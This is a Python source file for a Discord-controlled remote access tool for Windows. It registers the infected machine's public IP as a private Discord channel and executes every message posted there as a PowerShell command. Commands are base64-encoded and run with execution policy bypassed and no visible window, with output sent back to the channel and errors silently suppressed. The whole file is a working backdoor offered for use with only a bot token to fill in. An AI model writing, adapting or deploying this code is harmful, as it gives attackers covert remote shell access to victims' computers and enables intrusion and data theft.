import discord
import requests
import subprocess
import base64
import json
import os

DISCORD_TOKEN = "ENTER_YOUR_DISCORD_BOT_TOKEN_HERE"

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

current_working_directory = None

def get_initial_directory():
    full_cmd = """$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'Continue'
$OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
chcp 65001 | Out-Null

Get-Location | Select-Object -ExpandProperty Path"""
    
    cmd_bytes = full_cmd.encode('utf-16-le')
    encoded_cmd = base64.b64encode(cmd_bytes).decode('ascii')
    
    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", 
             "-EncodedCommand", encoded_cmd],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='replace',
            timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW,
            shell=False
        )
        
        if result.stdout:
            return result.stdout.strip()
    except:
        pass
    
    return "C:\\"

def execute_powershell_command(ps_command, change_dir=True):
    global current_working_directory
    
    if change_dir and current_working_directory:
        escaped_cwd = current_working_directory.replace("'", "''")
        ps_command = f"Set-Location '{escaped_cwd}'\n{ps_command}"
    
    full_cmd = f"""$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'Continue'
$OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
chcp 65001 | Out-Null

{ps_command}"""
    
    cmd_bytes = full_cmd.encode('utf-16-le')
    encoded_cmd = base64.b64encode(cmd_bytes).decode('ascii')
    
    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", 
             "-EncodedCommand", encoded_cmd],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='replace',
            timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW,
            shell=False
        )
    except subprocess.TimeoutExpired:
        return "ERROR: Command timed out after 30 seconds"
    except Exception as e:
        return f"ERROR: Failed to execute command: {str(e)}"
    
    output = ""
    
    if result.stdout:
        output += result.stdout
    
    if result.stderr:
        stderr_lines = result.stderr.strip().split('\n')
        clean_stderr = []
        for line in stderr_lines:
            line = line.strip()
            if line and not line.startswith('#< CLIXML') and not line.startswith('<Objs'):
                clean_stderr.append(line)
        
        if clean_stderr:
            if output:
                output += "\n"
            if not output.startswith("ERROR"):
                output += "ERROR:\n"
            output += '\n'.join(clean_stderr)
    
    return output.strip()

def execute_cmd(cmd):
    global current_working_directory
    
    if current_working_directory is None:
        current_working_directory = get_initial_directory()
    
    if not cmd.strip():
        return "Empty command"
    
    parts = cmd.strip().split()
    if not parts:
        return "Empty command"
    
    command = parts[0].lower()
    
    try:
        if command in ['cd', 'chdir']:
            if len(parts) > 1:
                path = ' '.join(parts[1:])
                escaped_path = path.replace("'", "''")
                
                ps_cmd = f"""
try {{
    Set-Location '{escaped_path}'
    Get-Location | Select-Object -ExpandProperty Path
}} catch {{
    Write-Error "Cannot change directory: $($_.Exception.Message)"
}}
"""
                
                result = execute_powershell_command(ps_cmd, change_dir=False)
                
                if not result.startswith("ERROR") and not result.startswith("Cannot change directory"):
                    lines = result.strip().split('\n')
                    new_path = lines[-1].strip()
                    if os.path.isdir(new_path):
                        current_working_directory = new_path
                        return f"Changed directory to: {new_path}"
                    else:
                        return f"Directory changed but path verification failed: {result}"
                else:
                    return result
            else:
                return f"Current directory: {current_working_directory}"
        
        elif command in ['pwd']:
            return f"Current directory: {current_working_directory}"
        
        elif command in ['dir', 'ls']:
            if len(parts) > 1:
                path = ' '.join(parts[1:])
                escaped_path = path.replace("'", "''")
                ps_cmd = f"Get-ChildItem -Path '{escaped_path}' -ErrorAction SilentlyContinue"
            else:
                ps_cmd = "Get-ChildItem -ErrorAction SilentlyContinue"
            
            return execute_powershell_command(ps_cmd)
        
        elif command in ['cat', 'type', 'get-content', 'gc']:
            if len(parts) > 1:
                path = ' '.join(parts[1:])
                escaped_path = path.replace("'", "''")
                ps_cmd = f"Get-Content -Path '{escaped_path}' -Raw -ErrorAction Stop"
                return execute_powershell_command(ps_cmd)
            else:
                return "ERROR: No file specified"
        
        else:
            return execute_powershell_command(cmd)
    
    except Exception as e:
        return f"ERROR processing command: {str(e)}"

@client.event
async def on_ready():
    global channel, current_working_directory
    
    try:
        guild = client.guilds[0]
        ip = requests.get('https://api.ipify.org').text.replace('.', '-')
        
        existing = discord.utils.get(guild.channels, name=ip)
        if existing:
            channel = existing
        else:
            overwrites = { 
                guild.default_role: discord.PermissionOverwrite(read_messages=False), 
                guild.me: discord.PermissionOverwrite(read_messages=True) 
            } 
            channel = await guild.create_text_channel(ip, overwrites=overwrites)
        
        current_working_directory = get_initial_directory()
        
        await channel.send(
            f"✅ Bot has been connected!\n"
            f"📁 Working directory: {current_working_directory}\n"
            f"🔧 PowerShell ready with UTF-8 encoding."
        )
        
    except Exception:
        pass

@client.event
async def on_message(message):
    global channel
    
    if 'channel' not in globals() or not channel:
        return
    
    if message.channel.id != channel.id:
        return
    
    if message.author.bot:
        return

    try:
        result = execute_cmd(message.content)
        
        if not result:
            result = f"Command executed successfully (no output)"
        
        while result:
            chunk = result[:1990]
            await message.channel.send(f"```\n{chunk}\n```")
            
            if len(result) <= 1990:
                break
            result = result[1990:]
            
    except Exception as e:
        error_msg = f"Error executing command: {str(e)}"
        await message.channel.send(f"```\n{error_msg}\n```")

if __name__ == "__main__":
    try:
        client.run(DISCORD_TOKEN)
    except:
        pass